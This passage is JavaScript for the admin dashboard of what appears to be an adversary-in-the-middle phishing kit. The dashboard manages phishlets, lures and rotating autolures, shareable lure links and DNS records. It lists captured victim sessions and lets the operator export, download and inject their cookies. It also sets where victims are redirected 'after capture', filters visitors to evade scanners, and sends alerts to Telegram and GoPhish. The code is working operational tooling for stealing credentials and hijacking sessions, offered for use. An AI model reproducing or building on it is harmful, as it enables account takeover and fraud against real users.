  try { await fn(); } catch (e) { toast(e.message || String(e), 'err'); }
  busy = false;
}
var reloadPage = function () { render(); };

var ACTIONS = {
  nav: function (id) { goto(id); },
  refresh: function () { render(); },
  'drawer-close': closeDrawer,
  'modal-close': closeModal,
  copy: function (id, el) { copy(el.getAttribute('data-copy')); },
  pg: function (id) { S.pageNum += (id === 'next' ? 1 : -1); render(); },
  export: function (id) { window.open('/api/v1/sessions/export?format=' + id); },
  clear: function () { if (confirm('Delete ALL sessions?')) run(async function () { var r = await API.post('/api/v1/sessions/clear'); toast(r.deleted + ' sessions deleted', 'ok'); render(); }); },

  sess: function (id) { run(function () { return openSession(id); }); },
  'sess-del': function (id) { if (confirm('Delete session #' + id + '?')) run(async function () { await API.del('/api/v1/sessions/' + id); toast('Deleted', 'ok'); closeDrawer(); render(); }); },
  'sess-export': function (id) { window.open('/api/v1/sessions/' + id + '/cookies'); },
  inject: function (id) { run(function () { return inject(id); }); },
  'dl-cookies': function (id) { run(async function () { downloadCookieFile(await API.get('/api/v1/sessions/' + id + '/cookies')); }); },
  'open-target': function (id, el) { window.open(el.getAttribute('data-copy'), '_blank'); },

  'pl-enable': function (id) { run(async function () { await API.post('/api/v1/phishlets/' + enc(id) + '/enable'); toast(id + ' enabled', 'ok'); render(); }); },
  'pl-disable': function (id) { run(async function () { await API.post('/api/v1/phishlets/' + enc(id) + '/disable'); toast(id + ' disabled', 'ok'); render(); }); },
  'pl-hide': function (id) { var p = S.phishlets.find(function (x) { return x.name === id; }); run(async function () { await API.post('/api/v1/phishlets/' + enc(id) + '/hide', { hidden: !p.hidden }); render(); }); },
  'pl-reload': function (id) { run(async function () { await API.post('/api/v1/phishlets/' + enc(id) + '/reload'); toast(id + ' reloaded', 'ok'); render(); }); },
  'pl-refresh': function () { run(async function () { var r = await API.post('/api/v1/phishlets/refresh'); toast('reloaded: ' + ((r.refreshed || []).length) + ' · added: ' + ((r.added || []).length), 'ok'); render(); }); },
  'pl-yaml': function (id) { run(async function () { var d = await API.get('/api/v1/phishlets/' + enc(id) + '/yaml'); openModal('⬡ ' + esc(id) + '.yaml', '<div class="pre">' + esc(d.yaml) + '</div>'); }); },
  'pl-dns': function (id) { run(async function () { var d = await API.get('/api/v1/phishlets/' + enc(id) + '/hosts'); var rows = d.records.map(function (r) { return '<div class="mono">' + esc(r.type) + '  ' + esc(r.name) + '  →  ' + esc(r.value) + '</div>'; }).join('') || '<span class="dim">no hostname set</span>'; openModal('DNS · ' + esc(id), rows); }); },
  'pl-hostname': function (id) { var p = S.phishlets.find(function (x) { return x.name === id; }); openModal('Set hostname · ' + esc(id), '<div class="field"><label>Hostname</label><input id="mVal" value="' + esc(p.hostname) + '"><span class="hint">e.g. ' + esc(ds() || 'yoursite.com') + '</span></div><div class="actions"><button class="btn primary" data-act="pl-hostname-save" data-id="' + esc(id) + '">Save</button></div>'); },
  'pl-hostname-save': function (id) { var v = $('#mVal').value.trim(); run(async function () { await API.post('/api/v1/phishlets/' + enc(id) + '/hostname', { hostname: v }); toast('hostname updated', 'ok'); closeModal(); render(); }); },
  'pl-unauth': function (id) { var p = S.phishlets.find(function (x) { return x.name === id; }); openModal('unauth_url · ' + esc(id), '<div class="field"><label>URL</label><input id="mVal" value="' + esc(p.unauth_url) + '" placeholder="empty = use global"><span class="hint">where unauthorized visitors go for this phishlet</span></div><div class="actions"><button class="btn primary" data-act="pl-unauth-save" data-id="' + esc(id) + '">Save</button></div>'); },
  'pl-unauth-save': function (id) { var v = $('#mVal').value.trim(); run(async function () { await API.post('/api/v1/phishlets/' + enc(id) + '/unauth_url', { url: v }); toast('saved', 'ok'); closeModal(); render(); }); },

  'lure-new': function () { newLureModal(false); },
  'auto-new': function () { newLureModal(true); },
  'lure-edit': function (id) { run(async function () { var l = await API.get('/api/v1/lures/' + id); editLureModal(l); }); },
  'lure-clone': function (id) { run(async function () { await API.post('/api/v1/lures/' + id + '/clone'); toast('cloned', 'ok'); render(); }); },
  'lure-del': function (id) { if (confirm('Delete lure #' + id + '?')) run(async function () { await API.del('/api/v1/lures/' + id); toast('deleted', 'ok'); render(); }); },
  'lure-pause': function (id) { openModal('Pause lure #' + id, '<div class="field"><label>Duration</label><input id="mVal" placeholder="1h, 30m, 2h30m"></div><div class="actions"><button class="btn primary" data-act="lure-pause-save" data-id="' + id + '">Pause</button></div>'); },
  'lure-pause-save': function (id) { var v = $('#mVal').value; run(async function () { await API.post('/api/v1/lures/' + id + '/pause', { duration: v }); toast('paused', 'ok'); closeModal(); render(); }); },
  'lure-unpause': function (id) { run(async function () { await API.post('/api/v1/lures/' + id + '/unpause'); toast('resumed', 'ok'); render(); }); },
  'lure-save': function (id) { saveLure(id); },
  'auto-notify': function (id, el) { run(async function () { await API.post('/api/v1/autolures/' + id + '/notify', { on: el.checked }); toast('notify ' + (el.checked ? 'on' : 'off'), 'ok'); }); },
  'auto-del': function (id) { if (confirm('Delete autolure #' + id + '?')) run(async function () { await API.del('/api/v1/lures/' + id); toast('deleted', 'ok'); render(); }); },

  'redir-new': function () { run(async function () { var d = await API.get('/api/v1/redirects/files'); var opts = d.files.map(function (x) { return '<option>' + esc(x) + '</option>'; }).join(''); openModal('New redirect', '<div class="field"><label>Subdomain</label><input id="rSub" placeholder="landing"></div><div class="field"><label>File</label><select id="rFile">' + opts + '</select><span class="hint">place HTML files in ' + esc(d.dir) + '</span></div><div class="field"><label>Target URL (optional)</label><input id="rUrl"></div><label class="switch mb14"><input type="checkbox" id="rTs"><span class="track"></span><span class="muted">Turnstile gate</span></label><div class="actions"><button class="btn primary" data-act="redir-save">Create</button></div>'); }); },
  'redir-save': function () { run(async function () { await API.post('/api/v1/redirects', { subdomain: $('#rSub').value.trim(), file: $('#rFile').value, target_url: $('#rUrl').value.trim(), turnstile: $('#rTs').checked }); toast('created', 'ok'); closeModal(); render(); }); },
  'redir-del': function (id) { if (confirm('Delete redirect #' + id + '?')) run(async function () { await API.del('/api/v1/redirects/' + id); render(); }); },

  'bl-del': function (id) { run(async function () { await API.del('/api/v1/blacklist/' + enc(id)); toast('removed', 'ok'); render(); }); },

  'cfg-save': function () { run(saveConfig); },
  'cfg-tab': function (id) { $$('#cfgTabs .tab').forEach(function (t) { t.classList.toggle('active', t.getAttribute('data-id') === id); }); $$('.cfg-pane').forEach(function (p) { p.style.display = p.getAttribute('data-pane') === id ? '' : 'none'; }); },
  tab: function (id, el) { ACTIONS['cfg-tab'](id); },
  'tg-test': function () { run(async function () { await API.post('/api/v1/integrations/telegram/test'); toast('test message sent', 'ok'); }); },
  'gp-test': function () { run(async function () { await API.post('/api/v1/integrations/gophish/test'); toast('GoPhish OK', 'ok'); }); },
  'cert-test': function () { run(async function () { await API.post('/api/v1/cert/test'); toast('certificate provisioning triggered', 'info'); }); },
  'ts-save': function () { run(async function () { await API.post('/api/v1/config/turnstile', { site_key: $('#tsKey').value.trim(), secret_key: $('#tsSec').value.trim() }); toast('turnstile saved', 'ok'); }); },
  'ts-off': function () { run(async function () { await API.post('/api/v1/config/turnstile', {}); toast('turnstile disabled', 'ok'); }); },

  logout: function () { run(async function () { await API.post('/api/v1/logout'); location.href = '/login'; }); },
  theme: function () {
    var cur = document.documentElement.getAttribute('data-theme') === 'light' ? 'dark' : 'light';
    document.documentElement.setAttribute('data-theme', cur);
    localStorage.setItem('theme', cur);
  }
};

function enc(s) { return encodeURIComponent(s); }
function ds() { return S.sys ? S.sys.domain : (S.config ? S.config.general.domain : ''); }

/* ---------------- forms ---------------- */
document.addEventListener('submit', function (e) {
  var f = e.target.closest('form[data-form]');
  if (!f) return;
  e.preventDefault();
  var kind = f.getAttribute('data-form');
  if (kind === 'bladd') {
    var ip = f.querySelector('[name=ip]').value.trim();
    run(async function () { await API.post('/api/v1/blacklist', { ip: ip }); toast('added', 'ok'); f.reset(); render(); });
  }
});

/* lure modals */
function newLureModal(auto) {
  var pls = S.phishlets.map(function (p) { return '<option value="' + esc(p.name) + '">' + esc(p.name) + '</option>'; }).join('');
  openModal(auto ? 'New autolure' : 'New lure',
    '<div class="field"><label>Phishlet</label><select id="lPl">' + pls + '</select></div>' +
    '<div class="field"><label>Subdomain</label><input id="lSub" placeholder="login"><span class="hint">empty = use the phishlet landing host</span></div>' +
    (auto ? '<div class="field"><label>Rotation interval</label><input id="lInt" placeholder="random 45–90m"><span class="hint">e.g. 30m, 1h, 2h30m</span></div>' : '<div class="field"><label>Extra URL params (optional)</label><input id="lParams" placeholder="k=v,k2=v2"></div>') +
    '<div class="actions"><button class="btn primary" data-act="lure-create" data-id="' + (auto ? 'auto' : 'lure') + '">Create</button></div>');
}
ACTIONS['lure-create'] = function (kind) {
  var pl = $('#lPl').value, sub = $('#lSub').value.trim();
  var body = { phishlet: pl, subdomain: sub };
  if (kind === 'auto') body.interval = $('#lInt').value.trim();
  run(async function () {
    var r = await API.post('/api/v1/lures', body);
    closeModal();
    if (kind !== 'auto' && $('#lParams') && $('#lParams').value.trim() && r.id !== undefined) {
      var u = await API.get('/api/v1/lures/' + r.id + '/url?params=' + encodeURIComponent($('#lParams').value.trim()));
      openModal('Lure ready', '<div class="field"><label>Share this link</label><div class="pre">' + esc(u.url) + '</div></div><div class="actions"><button class="btn sm" data-act="copy" data-copy="' + esc(u.url) + '">Copy</button></div>');
    } else {
      toast((kind === 'auto' ? 'autolure' : 'lure') + ' created', 'ok');
    }
    render();
  });
};
function editLureModal(l) {
  function f(label, field, val, hint) { return '<div class="field"><label>' + label + '</label><input data-lf="' + field + '" value="' + esc(val || '') + '">' + (hint ? '<span class="hint">' + hint + '</span>' : '') + '</div>'; }
  openModal('Edit lure #' + l.id,
    f('Path', 'path', l.path) +
    f('Hostname', 'hostname', l.hostname, 'must end with the base domain; empty clears it') +
    f('redirect_url', 'redirect_url', l.redirect_url, 'where to send the victim after capture') +
    f('UA filter (regex)', 'ua_filter', l.ua_filter) +
    f('info', 'info', l.info) +
    f('active_hours', 'active_hours', l.active_hours, 'HH:MM-HH:MM') +
    f('active_days', 'active_days', l.active_days, 'Mon,Tue,…') +
    f('active_tz', 'active_tz', l.active_tz, 'IANA tz') +
    f('og_title', 'og_title', l.og_title) + f('og_desc', 'og_desc', l.og_desc) +
    '<div class="actions"><button class="btn primary" data-act="lure-save" data-id="' + l.id + '">Save</button></div>');
}
function saveLure(id) {
  var fields = $$('[data-lf]');
  run(async function () {
    for (var i = 0; i < fields.length; i++) {
      await API.post('/api/v1/lures/' + id + '/edit', { field: fields[i].getAttribute('data-lf'), value: fields[i].value });
    }
    toast('saved', 'ok'); closeModal(); render();
  });
}

/* ---------------- config save ---------------- */
async function saveConfig() {
  var inputs = $$('[data-cfg]');
  for (var i = 0; i < inputs.length; i++) {
    var k = inputs[i].getAttribute('data-cfg');
    var v = inputs[i].value;
    if ((k === 'dashboard_pass' || k === 'teletoken' || k === 'gophish_api_key' || k === 'proxy_password') && v === '') continue;
    await API.post('/api/v1/config', { key: k, value: v });
  }
  var sws = $$('[data-cfgsw]');
  for (var j = 0; j < sws.length; j++) {
    await API.post('/api/v1/config', { key: sws[j].getAttribute('data-cfgsw'), value: sws[j].checked ? 'on' : 'off' });
  }
  toast('settings saved', 'ok');
  render();
}

/* ---------------- router ---------------- */
var VIEWS = {
  overview: [viewOverview, afterOverview],
  sessions: [viewSessions, afterSessions],
  phishlets: [viewPhishlets, null],
  lures: [viewLures, null],
  autolures: [viewAutolures, null],
  redirects: [viewRedirects, null],
  blacklist: [viewBlacklist, afterBlacklist],
  config: [viewConfig, null],
  system: [viewSystem, null]
};
function currentPage() { var h = (location.hash || '#/overview').replace(/^#\/?/, ''); return VIEWS[h] ? h : 'overview'; }

var rendering = false;
async function render() {
  if (rendering) return; rendering = true;
  S.page = currentPage();
  var t = TITLES[S.page];
  if (S.page !== 'sessions') setHeader(t[0], t[1], '<button class="btn sm" data-act="theme">◐</button><button class="btn sm" data-act="logout">Logout</button>');
  renderNav();
  var c = $('#content');
  c.innerHTML = '<div class="empty">loading…</div>';
  try {
    var fn = VIEWS[S.page][0];
    c.innerHTML = await fn();
    var after = VIEWS[S.page][1];
    if (after) await after();
  } catch (e) {
    c.innerHTML = '<div class="empty"><div class="big">⚠</div>' + esc(e.message || e) + '</div>';
  }
  rendering = false;
}
function rerender() { render(); }

var debT = null;
function debounce(fn, ms) { clearTimeout(debT); debT = setTimeout(fn, ms); }

/* ---------------- global click ---------------- */
document.addEventListener('click', function (e) {
  var t = e.target;
  while (t && t !== document && !t.getAttribute) t = t.parentNode;
  if (!t || t === document) return;
  var el = t.getAttribute && t.getAttribute('data-act') ? t : (t.closest ? t.closest('[data-act]') : null);
  if (!el) return;
  var act = el.getAttribute('data-act');
  var fn = ACTIONS[act === 'tab' ? 'tab' : act];
  if (!fn) return;
  // let switches handle their own change event
  if (act === 'auto-notify') return;
  e.preventDefault();
  fn(el.getAttribute('data-id'), el);
});
document.addEventListener('change', function (e) {
  var el = e.target;
  if (el && el.getAttribute && el.getAttribute('data-act') === 'auto-notify') ACTIONS['auto-notify'](el.getAttribute('data-id'), el);
});
$('#scrim').addEventListener('click', function () { closeDrawer(); closeModal(); });
$('#menuBtn').addEventListener('click', function () { $('#side').classList.toggle('open'); });
window.addEventListener('hashchange', render);

/* auto refresh on live pages */
function startTimer() {
  clearInterval(S.timer);
  S.timer = setInterval(function () {
    if (document.hidden) return;
    var ae = document.activeElement;
    if (ae && (ae.tagName === 'INPUT' || ae.tagName === 'SELECT' || ae.tagName === 'TEXTAREA') && $('#content').contains(ae)) return;
    if (S.page === 'overview' || S.page === 'sessions') render();
  }, 10000);
}
setInterval(function () {
  var txt = $('#liveText');
  if (txt) txt.textContent = 'live';
}, 1000);

/* init */
(async function init() {
  try {
    var saved = localStorage.getItem('theme'); if (saved) document.documentElement.setAttribute('data-theme', saved);
    S.me = await API.get('/api/v1/me');
    $('#build').textContent = 'v' + S.me.version.split(' ')[0];
    if (!location.hash) location.hash = '#/overview';
    await render();
    startTimer();
  } catch (e) {
    if ((e.message || '').indexOf('unauthorized') < 0) $('#content').innerHTML = '<div class="empty">' + esc(e.message) + '</div>';
  }
})();
`
